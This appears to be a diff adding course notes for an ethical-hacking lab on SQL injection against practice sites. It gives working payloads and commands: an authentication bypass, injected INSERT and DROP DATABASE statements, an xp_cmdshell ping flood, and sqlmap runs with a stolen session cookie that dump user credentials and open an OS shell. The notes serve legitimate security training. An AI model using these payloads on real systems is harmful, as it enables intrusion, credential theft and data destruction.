@@ -1,0 +1,234 @@
+Module 15: SQL Injection
+
+PS: SQL injection is the most common and devastating attack that attackers can use to take control of data-driven web applications and websites. 
+
+PS: Applications often use SQL statements to authenticate users, validate roles and access levels, store, obtain information for the application and user, and link to other data sources. 
+
+PS: SQL injection attacks work when applications do not properly validate input before passing it to a SQL statement.
+
+There are three main types of SQL injection:
+
+- In-band SQL injection: An attacker uses the same communication channel to perform the attack and retrieve the results
+- Blind/inferential SQL injection: An attacker has no error messages from the system with which to work, but rather simply sends a   malicious SQL query to the database
+- Out-of-band SQL injection: An attacker uses different communication channels (such as database email functionality, or file writing   and loading functions) to perform the attack and obtain the results
+
+
+1. Perform SQL injection attacks
+
+PS: SQL injection attacks are performed on SQL databases with weak codes that do not adequately filter, use strong typing, or correctly execute user input.
+
+
+a. Perform an SQL injection attack on an MSSQL database
+
+PS: Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
+
+PS: In blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injection.
+
+Step 1: Login Using Blind SQL Injection (.11)
+
+Launch Firefox-> http://www.goodshopping.com/ -> Login -> blah' or 1=1 -- -> Login 
+
+Step 2: Create a User Account Using SQL Injection
+
+2a: View the number of Users in the Database
+
+.19 -> search -> Microsoft SQL Server Management Studio 18 -> Connect -> Expand Database node-> Expand GoodShopping node -> Expand Tables node -> right-click dbo.Login -> Select Top 1000 Rows -> Database has 1 user
+
+2b: Add a User to the Database
+
+.11 -> Firefox -> GoodShopping site -> Login -> blah';insert into login values ('john','apple123'); -- -> Log in (if no error, you have created a user)
+Try Login with the new user -> Visit .19 -> right-click dbo.Login -> Select Top 1000 Rows -> See new user
+
+2c: Create a Database Using SQL Injection
+
+Login -> blah';create database mydatabase; --  (if no error, you have created 'mydatabase')
+
+.19 -> Microsoft SQL Server Management Studio -> un-expand Databases -> Disconnect -> Connect Object Explorer -> Connect -> Expand Databases -> View new Database
+
+2d: Delete/Drop the new Database Using SQL Injection
+
+Login -> blah'; DROP DATABASE mydatabase; -- -> Log in   (No error, means database is dropped)
+
+2e: Ping a Remote host (Ping of death) Using SQL Injection
+
+Login -> blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- -> Log in 
+.19 -> right-click Start -> Task Manager -> More details -> Details -> p -> (PING.EXE is running) 
+
+
+
+
+
+b. Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+
+PS: sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+
+PS: It comes with a powerful detection engine, many niche features, and a broad range of switches—from database fingerprinting and data fetching from the database to accessing the underlying file system and executing commands on the OS via out-ofband connections.
+
+Step 1: Extract the Profile Page URL and Cookies
+
+.13 -> Firefox -> www.moviescope.com -> sam/test -> Login 
+View Profile -> Copy the URL of the profile page 
+right-click anywhere in the web page -> Inspect Element (Q) -> Console -> >> document.cookie -> press Enter -> Copy the Cookie Value
+
+Step 2: Enumerate the Database
+
+$ sudo su
+$ sqlmap -u "http://www.moviescope.com/viewprofile.xxx" --cookie="[copied cookie]" --dbs  (extract database information of Moviescope website)
+
+sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application
+technology, and the backend DBMS, as shown in the screenshot.
+
+Step 3: Retrieve the Tables in the Database
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.xxx" --cookie="[copied cookie]" -D moviescope --tables    (moviescope is the database name of www.moviescope.com)
+
+Step 4: Retrieve the table content of one of the tables (User_Login)
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.xxx" --cookie="[copied cookie]" -D moviescope -T User_Login --dump  (dump all the User_Login table content). 
+Try to login with one of the retrieved credentials
+
+Step 5: Open a Remote interactive Shell with the database OS
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.xxx" --cookie="[copied cookie]" --os-shell 
+> hostname
+> TASKLIST   (view all running tasks)
+> help    (see all available commands)
+
+
+
+
+
+2. Detect SQL injection vulnerabilities using various SQL injection detection tools
+
+a. Detect SQL injection vulnerabilities using DSSS
+
+DSSS: Damn Small SQLi Scanner
+
+Step 1: Extract the Profile Page URL and Cookies
+
+.13 -> Firefox -> www.moviescope.com -> sam/test -> Login 
+View Profile -> Copy the URL of the profile page 
+right-click anywhere in the web page -> Inspect Element (Q) -> Console -> >> document.cookie -> press Enter -> Copy the Cookie Value
+
+Step 2: Scan the site for SQLi Vulnerability
+
+$ sudo su
+$ cd DSSS
+$ python3 dsss.py      (view available options/commands)
+$ python3 dsss.py -u "http://www.moviescope.com/viewprofile.xxx" --cookie="[copied cookie]"
+Copy the vulnerable link. Paste in browser. You can see the profile of all users.
+
+
+
+
+b. Detect SQL injection vulnerabilities using OWASP ZAP
+
+.19 -> ZAP -> No, do not persist -> Automated Scan -> url -> Everything else default -> Alerts -> Expand SQLi 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
